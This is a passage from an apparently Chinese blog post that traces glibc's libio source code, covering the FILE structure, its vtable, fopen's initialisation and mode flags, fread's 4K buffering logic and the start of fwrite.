JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>如上图所示，所有的<strong>FILE</strong>结构体的虚表指针均指向虚表<strong>_IO_file_jumps</strong>，在进行<strong>IO</strong>操作时，都会调用到该结构体中的函数。</li></ul><h2 id="0x02-相关操作"><a href="#0x02-相关操作" class="headerlink" title="0x02 相关操作"></a>0x02 相关操作</h2><h3 id="fopen"><a href="#fopen" class="headerlink" title="fopen"></a><strong>fopen</strong></h3><p><strong>fopen</strong>为<strong>stdio</strong>库中的函数，其在<strong>glibc/include/stdio.h</strong>中宏定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> fopen(fname, mode) _IO_new_fopen(fname, mode)</span></span><br></pre></td></tr></table></figure><p>由<strong>stdio.h</strong>宏定义可知，平时我们常用的<strong>fopen</strong>函数其实为定义在<strong>glibc/libio/iofopen.c</strong>中的<strong>_IO_new_fopen</strong>函数，该函数直接调用了<strong>__fopen_internal</strong>函数。<br><img src="https://upload-images.jianshu.io/upload_images/8447551-f321d98af24706ea.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="__fopen_internal"></p><ul><li><strong>__fopen_internal</strong>函数中第<strong>58-65</strong>行声明了一个<strong>locked_FILE</strong>结构体变量指针<strong>new_f</strong>，该结构体中主要包含了<strong>_IO_FILE_plus</strong>和<strong>_IO_wide_data</strong>两个结构，并为该声明的变量分配了空间。</li><li><strong>__fopen_internal</strong>函数中第<strong>72</strong>行调用了<strong>_IO_no_init</strong>函数对新申请的<strong>locked_FILE</strong>结构体进行了初始化，该函数在<strong>glibc/libio/genops.c</strong>中定义如下：<br><img src="https://upload-images.jianshu.io/upload_images/8447551-509fd4f3c31b2ba4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="_IO_no_init"><br>其中调用的<strong>_IO_old_init</strong>函数定义于其上方：<br><img src="https://upload-images.jianshu.io/upload_images/8447551-75e3e99f6d8f533d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="_IO_old_init"><br>不难看出，<strong>_IO_old_init</strong>函数主要是对<strong>_IO_FILE_plus</strong>结构体中的各个元素进行初始化，而<strong>_IO_no_init</strong>主要是对<strong>_IO_wide_data</strong> 结构体中的各个元素进行初始化。通过两个结构体的初始化，初步猜测，<strong>_IO_FILE_plus</strong>结构体中元素及虚表主要用于单字节的文件流处理流程中，<strong>_IO_wide_data</strong>结构体中的元素及虚表主要用于宽字节的文件流处理流程中。</li><li><strong>__fopen_internal</strong>函数中第<strong>73</strong>行调用了<strong>_IO_JUMPS</strong>函数对结构体的虚表进行了初始化，<strong>_IO_JUMPS</strong>函数在<strong>glibc/libio/libioP.h</strong>中宏定义如下：<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_JUMPS(THIS) (THIS)-&gt;vtable</span></span><br></pre></td></tr></table></figure>即将<strong>_IO_FILE_plus</strong>结构体中的虚表指针赋值为虚表<strong>_IO_file_jumps</strong>的地址。</li><li><strong>__fopen_internal</strong>函数中第<strong>74</strong>行调用了<strong>_IO_new_file_init_internal</strong>函数将新初始化的结构体链入<strong>_IO_list_all</strong>链表的头部，该函数在<strong>glibc/libio/fileops.c</strong>中定义如下：<br><img src="https://upload-images.jianshu.io/upload_images/8447551-59e7bb31a10b0e8e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="_IO_new_file_init_internal"><br>该函数主要实现了将初始化好的<strong>_IO_FILE_plus</strong>结构体链入<strong>_IO_list_all</strong>链表头部的功能，其中链入链表的功能主要是由<strong>_IO_link_in</strong>函数进行实现，该函数定义在<strong>glibc/libio/genops.c</strong>中。除了实现链入功能外，还对<strong>_IO_FILE_plus</strong>结构体加入了相应的属性，如<strong>CLOSED_FILEBUF_FLAGS</strong>(可关闭？)属性以及<strong>_IO_link_in</strong>函数中的<strong>_IO_LINKED</strong>已链接属性第<strong>115</strong>行，对<strong>_fileno</strong>函数赋值为<strong>-1</strong>，该字段代表该文件流在<strong>_IO_list_all</strong>链表中的序号，此处赋值为<strong>-1</strong>相当于对该字段进行一个非法数值的初始化，后面会有<strong>_IO_file_is_open</strong>函数专门对<strong>_fileno</strong>数值是否合法进行<strong>check</strong>。</li><li><strong>__fopen_internal</strong>函数中第<strong>78</strong>行调用了<strong>_IO_file_open</strong>函数，开始执行真正意义上的<strong>fopen</strong>操作，该函数在<strong>glibc/libio/fileops.c</strong>中定义如下：<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">versioned_symbol(libc, _IO_new_file_fopen, _IO_file_fopen, GLIBC_2_1);</span><br></pre></td></tr></table></figure>即<strong>_IO_file_fopen</strong>函数等价于<strong>_IO_new_file_fopen</strong>函数，该函数定义于同一文件的第<strong>211</strong>行(太长了就不一次性全部贴了)。<br><img src="https://upload-images.jianshu.io/upload_images/8447551-d05c3415337f91ad.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="_IO_new_file_fopen(1)"></li></ul><p><strong>_IO_new_file_fopen</strong>有<strong>4</strong>个参数，分别是文件指针、文件名、属性、是否为<strong>32</strong>位，其中第一个参数为前面步骤初始化的<strong>_IO_FILE</strong>结构体指针，第<strong>2、3</strong>两个参数为用户在调用<strong>stdio.h</strong>中<strong>fopen</strong>函数传入的参数，第四个参数为<strong>glibc/libio、iofopen.c</strong>中<strong>_IO_new_fopen</strong>函数调用<strong>__fopen_internal</strong>函数时传入的常亮<strong>1</strong>。该段代码除了声明变量外主要进行了<strong>2</strong>个操作：检查该文件流是否打开、根据调用参数的主属性为该文件流添加<strong>flag</strong>。<br>第一个操作通过调用<strong>_IO_file_is_open</strong>函数来实现，该函数在<strong>glibc/libio/libioP.h</strong>中宏定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> _IO_file_is_open(__fp) ((__fp)-&gt;_fileno != -1)</span></span><br></pre></td></tr></table></figure><p>即通过检查<strong>FILE</strong>结构体的<strong>_fileno</strong>是否为合法序号来判断检该文件流是否为已打开状态。<br>第二个操作则是通过<strong>mode</strong>，即<strong>fopen</strong>函数第二个参数的第一个字符来确定该文件流的属性，并添加对应的<strong>flag</strong>。在写入<strong>flag</strong>字段前，代码中有<strong>3</strong>个比那里那个来分别存储不同的属性，这三个变量分别是<strong>omode</strong>、<strong>oflags</strong>、<strong>read_write</strong>，其中<strong>omode</strong>标志文件的读写属性，<strong>oflags</strong>标志文件的修改方式，<strong>read_write</strong>标志文件内容的读写方式。有如下对应关系：<br><img src="https://upload-images.jianshu.io/upload_images/8447551-b8138887f5cfc336.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="主属性对应关系"><br><strong>_IO_new_file_fopen</strong>继续往后走，代码如下：<br><img src="https://upload-images.jianshu.io/upload_images/8447551-6f1dbd9480994373.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="_IO_new_file_fopen(2)"><br>该段代码主要进行了<strong>2</strong>个操作：通过文件流副属性获取对应的<strong>flag</strong>、调用<strong>_IO_file_open</strong>函数打开文件。<br>第一个操作与主属性的表示相似，副属性有如下的对应关系：<br><img src="https://upload-images.jianshu.io/upload_images/8447551-405fc708c4bb927b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="附属性对应关系"><br>在将所有附属性遍历完后，会调用<strong>_IO_file_open</strong>函数用于打开文件并返回句柄，该函数有6个参数，该函数在<strong>glibc/libio/fileops.c</strong>中定义如下：<br><img src="https://upload-images.jianshu.io/upload_images/8447551-34f2906143d8329b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="_IO_file_open"><br>该函数中，首先会判断<strong>FILE</strong>结构体的<strong>_flags2</strong>是否有<strong>_IO_FLAGS2_NOTCANCEL</strong>位，即是否含有<strong>c</strong>的副属性，若有则会调用<strong>__open_nocancel</strong>函数，若无则会调用<strong>__open</strong>函数，从这两个函数传入了相同的参数可以看出，这两个函数实现了相似的功能，两个函数在<strong>glibc/sysdeps/unix/sysv/linux/open64.c</strong>中有宏定义如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">strong_alias(__libc_open64 ,  __open);</span><br><span class="line">...</span><br><span class="line">strong_alias(__open64_nocancel, __open_nocancel);</span><br></pre></td></tr></table></figure><p>以及还有在某些情况<strong>__open64_nocancel</strong>函数可以等价为<strong>__libc_open64</strong>函数的定义。在同一文件中，两个函数定义如下：<br><img src="https://upload-images.jianshu.io/upload_images/8447551-b7ef7e1dee46a63c.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="__libc_open64"><br><img src="https://upload-images.jianshu.io/upload_images/8447551-22b4a88fff914c54.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="__open64_nocancel"><br>可以看到这两个函数在<strong>return</strong>时均调用了<strong>INLINE_SYSCALL_CALL</strong>函数，即到最后将带有文件修改方式和读写属性的<strong>flag</strong>作为参数，调用<strong>SYSCALL</strong>进行打开文件操作，并将句柄返回。（再往底层就是直接宏定义汇编代码，就不继续深究<strong>INLINE_SYSCALL_CALL</strong>函数内部了）<br>返回后，回到<strong>_IO_file_open</strong>函数中，接下来将打开文件后的文件流序号赋值给<strong>_fileno</strong>字段，之后调用了<strong>_IO_mask_flags</strong>将具有读写方式的属性加入<strong>FILE</strong>结构体的<strong>flags</strong>字段中，若读写方式为<strong>a</strong>(追加)，则会将文件末尾作为文件的偏移。最后会调用<strong>_IO_link_in</strong>函数确保该结构体已链入<strong>_IO_list_all</strong>链表(因为在<strong>_IO_link_in</strong>函数中会有对<strong>_IO_LINKED</strong>的<strong>check</strong>，所以并不是重复链入)，至此<strong>_IO_file_open</strong>函数执行完毕。<br>从<strong>_IO_file_open</strong>返回后回到<strong>_IO_new_file_fopen</strong>函数，之后有的一个大段的<strong>if</strong>语句中，大概是给之前初始化的<strong>_wide_data</strong>中的各元素进行赋值，在<strong>if</strong>函数的最后将<strong>FILE</strong>结构体中的<strong>_mode</strong>字段赋值为<strong>1</strong>。该段代码大概如下(语句太长就不贴了)：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(result != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">    cs = <span class="built_in">strstr</span>(last_recognized +<span class="number">1</span> , <span class="string">",ccs="</span>);</span><br><span class="line">    <span class="keyword">if</span>(cs != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        ......                  <span class="comment">//大概是给_wide_data中的各元素赋值</span></span><br><span class="line">        result-&gt;_mode = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> result;</span><br></pre></td></tr></table></figure><ul><li><strong>return</strong>后返回到<strong>__fopen_internal</strong>函数中，此时执行到了<strong>__fopen_internal</strong>函数的最后一步，如果上面调用<strong>_IO_file_fopen</strong>函数打开文件失败，则执行函数第<strong>81-83</strong>行：调用<strong>_IO_un_link</strong>函数将链入<strong>_IO_list_all</strong>的结构体摘除，并<strong>free</strong>掉为其申请的空间，之后<strong>return NULL</strong>；若打开文件成功，则会执行第<strong>79</strong>行：调用<strong>__fopen_maybe_mmap</strong>函数并返回。该函数在<strong>glibc/libio/iofopen.c</strong>中定义如下；<br><img src="https://upload-images.jianshu.io/upload_images/8447551-bcd6def471f7b6cc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="__fopen_maybe_mmap"><br>该函数会判断<strong>_flags2</strong>字段中是否含有<strong>_IO_FLAGS2_MMAP</strong>位，即在打开文件时是否有<strong>m</strong>属性，还会检查<strong>_flags</strong>字段中是否含有<strong>_IO_NO_WRITES</strong>位，即在打开文件时是否有<strong>r</strong>属性。即在打开文件时有<strong>rm</strong>两个属性，则会执行函数的主体部分，调用<strong>_IO_JUMPS_FILE_plus</strong>函数将重置<strong>FILE</strong>结构体的<strong>vtable</strong>虚表，该函数在<strong>glibc/libio/libioP.h</strong>中定义如下：<br><img src="https://upload-images.jianshu.io/upload_images/8447551-84737a58622c32a4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="_IO_JUMPS_FILE_plus"><blockquote><p>以上，完成了对<strong>fopen</strong>函数源码的分析，该函数主要进行了<strong>3</strong>个操作：为文件流申请空间；初始化<strong>FILE</strong>结构体及虚表，包括将文件流链入<strong>_IO_list_all</strong>链表中；打开文件流，包括读取文件属性以及利用系统调用打开文件。<br>通过阅读源码，对文件属性有了<strong>船新</strong>的认识：</p><ul><li>除了日常用到的<strong>r/w/a/b/+</strong>之外还有<strong>x/m/c/e</strong>这<strong>4</strong>个属性，而且作为主属性的<strong>r/w/a</strong>必须在<strong>fopen</strong>第二个参数的开头，即只能<strong>wb</strong>而不能<strong>bw</strong>。</li><li>在正常编写代码时宏观能够感到打开文件方式不一样的属性有<strong>r/w/a/+/x</strong>，而<strong>m/c/e</strong>这三个属性的采用，仅仅会在系统进行打开文件操作过程中进行一些不太影响大局的判断操作，在宏观上感觉不到。这可能也是<strong>FILE</strong>结构体中<strong>_flags</strong>和<strong>_flags2</strong>两个字段的区别。</li><li>在上一点中所没提到的<strong>b</strong>属性，虽然一直知道是以二进制方式打开文件，但是在<strong>_IO_new_file_fopen</strong>函数中的关于副属性的<strong>switch…case</strong>语句中，<strong>b</strong>属性并没有什么卵用。没有加入任何<strong>flag</strong>标志位，只是将<strong>last_recognized</strong>赋值为<strong>b</strong>，即最后一个识别的属性是<strong>b</strong>。就算不考虑后续代码，只看<strong>switch…case</strong>语句的结果，当<strong>b</strong>属性后面跟有其他属性，那么<strong>b</strong>属性的<strong>case</strong>中没有留下任何东西(其他属性多多少少修改了<strong>_flags/_flags2</strong>字段)。</li></ul></blockquote></li></ul><h3 id="fread"><a href="#fread" class="headerlink" title="fread"></a><strong>fread</strong></h3><p><strong>fread</strong>函数的一般用法为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fread( <span class="keyword">void</span> *<span class="built_in">buffer</span>, <span class="keyword">size_t</span> <span class="built_in">size</span>, <span class="keyword">size_t</span> count, FILE *stream );</span><br></pre></td></tr></table></figure><p>该函数共有<strong>4</strong>个参数，<strong>buffer</strong>代表接收从文件读取数据的变量首地址，<strong>size</strong>代表每个对象的大小，<strong>count</strong>代表对象的个数，<strong>stream</strong>是代表文件流。即该函数实现了从<strong>stream</strong>中读<strong>size * count</strong>字节数据并赋给<strong>buffer</strong>所指向的地址。该函数在<strong>glibc/libio/iofread.c</strong>中有如下宏定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">weak_alias(_IO_fread , fread)</span><br></pre></td></tr></table></figure><p>即<strong>fread</strong>函数原形为<strong>_IO_fread</strong>函数，该函数在同一文件中定义如下：<br><img src="https://upload-images.jianshu.io/upload_images/8447551-9a286d882c2775ad.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="_IO_fread"><br>该函数的最外层代码比较短，逻辑也很清晰，首先在第<strong>34</strong>行调用了<strong>CHECK_FILE</strong>函数对将要输入的文件流进行检查，该函数在<strong>glibc/libio/libioP.h</strong>中有宏定义如下：<br><img src="https://upload-images.jianshu.io/upload_images/8447551-c819c1082857fc6f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="CHECK_FILE"><br>即当<strong>IO_DEBUG</strong>被定义时，会对<strong>FILE</strong>结构体的<strong>_flags</strong>字段进行<strong>_IO_MAGIC_MASK</strong>位的验证，若不存在，则说明传进来的不是<strong>FILE</strong>结构体，就<strong>return 0</strong>。<br>接下来在函数的第<strong>37、39</strong>行分别调用了<strong>_IO_acquire_lock</strong>和<strong>_IO_release_lock</strong>函数，用来加锁以及去锁。<br>在中间的第<strong>38</strong>行，调用了<strong>_IO_sgetn</strong>函数进行读入数据操作。经过辗转后发现该函数为虚表中的<strong>__xsgetn</strong>，即<strong>_IO_file_xsgetn</strong>函数，该函数定义于<strong>glibc/libio/fileop.c</strong>中，是<strong>fread</strong>函数的关键。<br><img src="https://upload-images.jianshu.io/upload_images/8447551-11bf2a0ea40a2f7a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="_IO_file_xsgetn(1)"><br>该函数中定义了<strong>4</strong>个变量，分别是<strong>want</strong>表示还要读入的数据字节数、<strong>have</strong>表示输入缓冲区中剩余的空间大小、<strong>count</strong>表示要读出数据的个数、<strong>s</strong>表示接收读出数据的变量地址。由于我们刚从<strong>fopen</strong>初始化过来，因此<strong>FILE</strong>结构体中的各字段仍是空值，因此会进入在第<strong>1302-1311</strong>行的<strong>if-else</strong>语句，该语句首先判断该文件流中的<strong>_IO_save_base</strong>字段是否已经赋值，即文件流是否有备份的缓冲区，若有则会将该缓冲区<strong>free</strong>掉，并去掉<strong>_IO_IN_BACKUP</strong>位，最后调用<strong>_IO_doallocbuf</strong>函数。该函数在<strong>glibc/libio/genops.c</strong>中定义如下：<br><img src="https://upload-images.jianshu.io/upload_images/8447551-df3b83fc82c0c12b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="_IO_doallocbuf"><br>该函数经过一些检查后会调用<strong>_IO_DOALLOCATE</strong>函数，该函数在<strong>glibc/libio/libioP.h</strong>中有宏定义为<code>#define  _IO_DOALLOCATE(FP)  JUMP0(__doallocate , FP)</code>，即为虚表中的<strong>__doallocate</strong>，对应<strong>_IO_file_doallocate</strong>函数，该函数在<strong>glibc/libio/filedoalloc.c</strong>中定义如下：<br><img src="https://upload-images.jianshu.io/upload_images/8447551-6365d698715c1f55.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="_IO_file_doallocate"><br>可以看到在第<strong>94</strong>行给文件流字段加上了<strong>_IO_LINE_BUF</strong>字段，函数主要是在最后调用了<strong>malloc</strong>函数分配了<strong>size</strong>大小的空间给指针<strong>p</strong>，<strong>size</strong>在第<strong>83</strong>行被赋值为<strong>_IO_BUFSIZ</strong>,该字段有宏定义为<strong>8192</strong>，但在第<strong>84</strong>行调用了<strong>_IO_SYSSTAT</strong>函数，该函数为虚表中的<strong>__stat</strong>，对应着<strong>_IO_file_stat</strong>函数，该函数最终将调用<strong>syscall</strong>来获取该文件状态，并初始化结构体<strong>st</strong>，初始化后的<strong>st</strong>如下图：<br><img src="https://upload-images.jianshu.io/upload_images/8447551-34080a8283520c2a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="struct stat st"><br>因为在第<strong>97</strong>行存在判断，因此<strong>size</strong>最后赋值为<strong>st.blksize</strong>的<strong>0x1000</strong>字节，即<strong>4K</strong>大小。紧接着调用了<strong>_IO_setb</strong>函数，该函数在<strong>glibc/libio/genops.c</strong>中定义如下：<br><img src="https://upload-images.jianshu.io/upload_images/8447551-5af05fa775fe81da.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="_IO_setb"><br>该函数主要实现了对<strong>_IO_buf_base</strong>和<strong>_IO_buf_end</strong>两个字段进行赋值。到这里可以知道<strong>_IO_doallocbuf</strong>函数实现了给文件流分配<strong>4K</strong>空间用作缓存缓冲区的操作。紧接着回到<strong>_IO_file_xsgetn</strong>函数是一个<strong>100</strong>多行的<strong>while</strong>循环：<br><img src="https://upload-images.jianshu.io/upload_images/8447551-cf6d63efb490d5dc.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="_IO_file_xsgetn(2)"></p><ul><li><strong>n &lt;= 4K</strong></li></ul><p>因为是刚刚完成初始化的文件流，第一次进行<strong>fread</strong>时所以会进入第<strong>1341</strong>行的判断语句，则会调用<strong>__underflow</strong>函数，该函数在<strong>glibc/libio/genops.c</strong>中定义如下：<br><img src="https://upload-images.jianshu.io/upload_images/8447551-b054ea0477b06bf0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="__underflow"><br>该函数经过一系列检查后调用了<strong>_IO_UNDERFLOW</strong>函数，该函数即虚表中的<strong>__underflow</strong>字段，对应<strong>_IO_new_file_underflow</strong>函数，该函数定义在<strong>glibc/libio/fileop.c</strong>中，进入函数后按照当前状态会直接跳过前面的检查，直接从第<strong>520</strong>行开始执行，如下图：<br><img src="https://upload-images.jianshu.io/upload_images/8447551-54e6f6fe0d6fefa0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="_IO_new_file_underflow(partial)"><br>首先将<strong>read</strong>和<strong>write</strong>的<strong>6</strong>个字段都初始化为<strong>_IO_buf_base</strong>，之后调用<strong>_IO_SYSREAD</strong>函数尝试从<strong>fp</strong>中读<strong>_IO_buf_end - _IO_buf_base</strong>即<strong>4K</strong>大小的数据到从<strong>_IO_buf_base</strong>开始的空间中，该函数的原形为虚表中的<strong>__read</strong>，对应<strong>_IO_file_read</strong>函数。该函数在<strong>glibc/libio/fileops.c</strong>中定义如下：<br><img src="https://upload-images.jianshu.io/upload_images/8447551-19d9461cec6a986e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="_IO_file_read"><br>该函数再往下就是调用<strong>__read()</strong>或<strong>__read_nocancel()</strong>直接进行系统调用进行读入，返回值为实际读取的大小，赋值给<strong>count</strong>。若正常读取成功，则会将<strong>_IO_read_end</strong>和<strong>offset</strong>字段增加<strong>count</strong>的大小，返回<strong>_IO_read_ptr</strong>的值。调用完该函数后，返回<strong>_IO_file_xsgetn</strong>函数，此时该文件中最多<strong>4K</strong>大小的数据已经被读入到了缓存缓冲区中，且<strong>_IO_read_base</strong>和<strong>_IO_read_end</strong>两个指针分别对应这想要读入的数据的起始位置和终止位置，相当于输入缓冲区，此时执行<strong>continue</strong>，重新开始循环，进入第<strong>1316</strong>行的判断语句，直接调用<strong>memcpy</strong>函数，将数据从输入缓冲区中拷贝如目标变量中，<strong>_IO_read_ptr</strong>字段加上相应大小，此时所有数据全部读入，<strong>want</strong>赋值为<strong>0</strong>，一路执行，最后跳出循环。</p><ul><li><strong>n &gt; 4K</strong><br>若读取数据大小大于<strong>4K</strong>，则不会进入第<strong>1341</strong>行的判断句，而是继续往下执行：<br><img src="https://upload-images.jianshu.io/upload_images/8447551-68ee81c90d94b175.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="_IO_file_xsgetn(3)"><br>紧接着调用了<strong>_IO_setg</strong>和<strong>_IO_setp</strong>两个函数，这两个函数在<strong>glibc/libio/libioP.h</strong>中有宏定义如下：<br><img src="https://upload-images.jianshu.io/upload_images/8447551-e93cea2c6539dadf.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="_IO_setp/_IO_setg"><br>即实现了将<strong>FILE</strong>结构体中的<strong>read</strong>和<strong>write</strong>相关共<strong>6</strong>个指针均初始化为<strong>_IO_buf_base</strong>的功能。随后在<strong>1357</strong>行的判断中，是将之前分配的缓冲区大小作为一个<strong>block_size</strong>，因为这条分支接下来会直接调用<strong>_IO_SYSREAD</strong>函数，将数据直接从文件流中读入变量中而不经过缓冲区，所以为了(优化性能？)，每次只读取<strong>block_size</strong>大小的数据，即<strong>4K</strong>。调用完<strong>_IO_SYSREAD</strong>后<strong>want</strong>会减去<strong>4K</strong>再次进行循环，直到最后小于<strong>4K</strong>的一部分，会和上面<strong>n &lt;= 4K</strong>经历相同的过程，并退出循环。<blockquote><p>至此，分析完了<strong>fread</strong>函数主要流程，尤其是<strong>_IO_file_xsgetn</strong>函数的执行流程。<strong>fread</strong>函数主要进行了<strong>1</strong>个操作，调用<strong>_IO_file_xsgetn</strong>函数，当然加锁也是比较重要的。<strong>_IO_file_xsgetn</strong>函数，主要进行了<strong>3</strong>个操作：调用<strong>_IO_doallocbuf</strong>给<strong>FILE</strong>结构体分配缓冲区；当<strong>n &lt;= block_size</strong>时，调用<strong>_IO_file_underflow</strong>将文件流中的数据读入缓冲区再调用<strong>memcpy</strong>从缓冲区拷贝至目标变量中；当<strong>n &gt; block_size</strong>时，大部分先对齐到<strong>block_size</strong>，调用<strong>_IO_SYSREAD</strong>函数直接从文件流读入到目标变量，若还有剩余的数据再用老方从走缓冲区拷贝到目标变量中。<br>通过阅读源码，对<strong>FILE</strong>结构体以及其中各字段所代表的含义有了船新的认识：</p><ul><li>首先是从<strong>_IO_read_ptr</strong>到<strong>_IO_buf_end</strong>这<strong>8</strong>个字段，原本认为是共申请了<strong>3</strong>个缓冲区，通过阅读源码后知道了只申请了<strong>1</strong>个缓冲区，其中<strong>_IO_buf_base</strong>和<strong>_IO_buf_end</strong>指向这个缓冲区的两端，其余<strong>6</strong>个<strong>read</strong>和<strong>write</strong>字段没事的时候都与<strong>_IO_buf_base</strong>的值相同，在进行读操作时，相当于<strong>3</strong>个<strong>read</strong>指针起作用控制缓冲区中的内容，可以推出在进行写操作时，<strong>3</strong>个<strong>read</strong>指针与<strong>_IO_buf_base</strong>的值相同，而<strong>3</strong>个<strong>write</strong>指针独起作用控制缓冲区中的内容。</li><li>其次<strong>_IO_save_base</strong>到<strong>_IO_save_end</strong>这<strong>3</strong>个字段，因为在该段代码中只存在几处判断，并没有实际用处，所以判断大概是为了保存某个时刻缓冲区而设置的指针。</li><li>最后是在调试时发现的<strong>FILE</strong>结构体有多种形态，比如我在调试时看到的<strong>FILE</strong>结构体实际上是<strong>glibc/libio/bits/libio.h</strong>中定义的<strong>_IO_FILE_complete</strong>结构体。最终究其原因，是因为有个宏判断把定义结构体的大括号给吃掉了。如下图：<br><img src="https://upload-images.jianshu.io/upload_images/8447551-5087742c100b96bd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="骚骚的宏判断"></li></ul></blockquote></li></ul><h3 id="fwrite"><a href="#fwrite" class="headerlink" title="fwrite"></a><strong>fwrite</strong></h3><p><strong>fwrite</strong>函数的一般用法为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fwrite(<span class="keyword">const</span> <span class="keyword">void</span>* <span class="built_in">buffer</span>, <span class="keyword">size_t</span> <span class="built_in">size</span>, <span class="keyword">size_t</span> count, FILE* stream);</span><br></pre></td></tr></table></figure><p>与<strong>fread</strong>函数相似，该函数共有<strong>4</strong>个参数，<strong>buffer</strong>代表存储要写入文件数据的首地址，<strong>size</strong>代表每个对象的大小，<strong>count</strong>代表对象的个数，<strong>stream</strong>代表文件流。即该函数实现了将<strong>buffer</strong>中<strong>size * count</strong>字节数据写入<strong>stream</strong>文件流的操作。该函数在<strong>glibc/libio/iofwrite.c</strong>中有如下宏定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">weak_alias(_IO_fwrite , fwrite)</span><br></pre></td></tr></table></figure><p>即<strong>fwrite</strong>函数原形为<strong>_IO_fwrite</strong>函数，该函数在同一文件中定义如下：<br><img src="https://upload-images.jianshu.io/upload_images/8447551-633c55b0ae9a4f41.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="_IO_fwrite"><br>也是一样的调用了<strong>CHECK_FILE</strong>函数进行检查，以及在调用关键函数前后加锁与去锁。在第<strong>39</strong>行调用了函数<strong>_IO_sputn</strong>，该函数在经过一系列定义和宏定义后为虚表中的<strong>__xsputn</strong>，即<strong>_IO_new_file_xsputn</strong>函数，该函数定义在<strong>glibc/libio/fileops.c</strong>中，是<strong>fwrite</strong>函数的关键。<br><img src="https://upload-images.jianshu.io/upload_images/8447551-bb2b3bc71374d62f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" 